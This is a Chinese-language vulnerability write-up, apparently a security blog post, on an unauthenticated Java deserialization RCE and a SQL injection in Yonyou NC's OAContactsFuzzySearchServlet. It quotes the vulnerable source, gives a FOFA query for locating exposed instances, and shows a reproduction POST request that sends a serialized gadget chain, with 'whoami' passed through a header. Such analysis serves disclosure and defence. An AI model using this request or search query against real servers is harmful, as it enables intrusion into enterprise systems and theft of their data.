---
title: "用友NC OAContactsFuzzySearchServlet 反序列化漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-OAContactsFuzzySearchServlet-rce-sqli.html
asset_dir: assets/用友nc-oacontactsfuzzysearchservlet-反序列化漏洞+sql注入漏洞
---

# 用友NC OAContactsFuzzySearchServlet 反序列化漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/20 08:49
- 738浏览
- [0评论](#comment)
- 28分钟阅读

深入探索

计算机安全

Authorization

身份验证

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`OAContactsFuzzySearchServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`OAContactsFuzzySearchServlet`反序列化该恶意对象时，就会触发[代码执行](https://mrxn.net/tag/rce)。该漏洞可能允许攻击者在服务器上执行任意代码，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞扫描服务

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

## 反序列化

直接看下`OAContactsFuzzySearchServlet`的实现

```
public class OAContactsFuzzySearchServlet extends HttpServlet {
    private static final long serialVersionUID = -5847889958965745395L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

深入探索

编程语言教程

安全运维咨询

漏洞预警服务

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行**（**[RCE](https://mrxn.net/tag/rce)**）漏洞。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

SQL注入防护

## SQL注入

在反序列化解析后其中的**userCode**和**dsName**被带入`getUserByCodeOrPK`方法

```
try {
    headInfo = (HashMap)in.readObject();
} catch (ClassNotFoundException e1) {
    CpLogger.error(e1.getMessage());
}

String userCode = (String)headInfo.get("userCode");
String dsName = (String)headInfo.get("dsName");
ISecurityTokenCallback sc = (ISecurityTokenCallback)NCLocator.getInstance().lookup(ISecurityTokenCallback.class);
InvocationInfoProxy.getInstance().setUserCode(userCode);
byte[] annonyTokens = sc.token("0".getBytes(), userCode.getBytes());
sc.restore(annonyTokens);
UserQryService service = new UserQryServiceImpl();
CpUserWithDetailVO[] userArray = service.getUserByCodeOrPK(userCode, dsName);
```

继续跟进`getUserByCodeOrPK`方法

```
public class UserQryServiceImpl implements UserQryService {
    public CpUserWithDetailVO[] getUserByCodeOrPK(String param, String dataSourceName) {
        String tableName = CpUserWithDetailUtil.getDefaultTableName();
        PtBaseDAO dao = new PtBaseDAO(dataSourceName);
        String sql = "SELECT * FROM " + tableName + " WHERE cp_user.user_name like '%" + param + "%'  OR cp_user.user_code like '%" + param + "%'";
        SQLParameter SqlParam = new SQLParameter();
        SqlParam.addParam(param);
        SqlParam.addParam(param);
        List list = null;
```

`param` 变量（即 `userCode`）是直接从反序列化的 `headInfo` 中获取的用户输入，未经任何过滤或转义，就被直接用于构建SQL查询语句。尽管代码后续创建了 `SQLParameter` 对象并调用了 `addParam(param)`，但这些参数是为**预编译语句**准备的。然而，`sql` 字符串本身是通过字符串拼接构建的，而不是一个带有占位符的预编译语句模板。因此，`SQLParameter` 的使用在此处无法阻止SQL注入，因为注入点在 `sql` 字符串被解析和执行之前就已经形成了，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /servlet/OAContactsFuzzySearchServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行命令执行回显

代码安全审计

[![用友NC OAContactsFuzzySearchServlet 反序列化漏洞+SQL注入漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

成功执行命令并回显执行结果

[![用友NC OAContactsFuzzySearchServlet 反序列化漏洞+SQL注入漏洞](images/img-002-a16a942bc8d5.webp)](https://image.mrxn.net/01619f0cd03041c8aa7a753a62a35850.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.反序列化](#toc-4-1-)
- [4.2.SQL注入](#toc-4-2-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
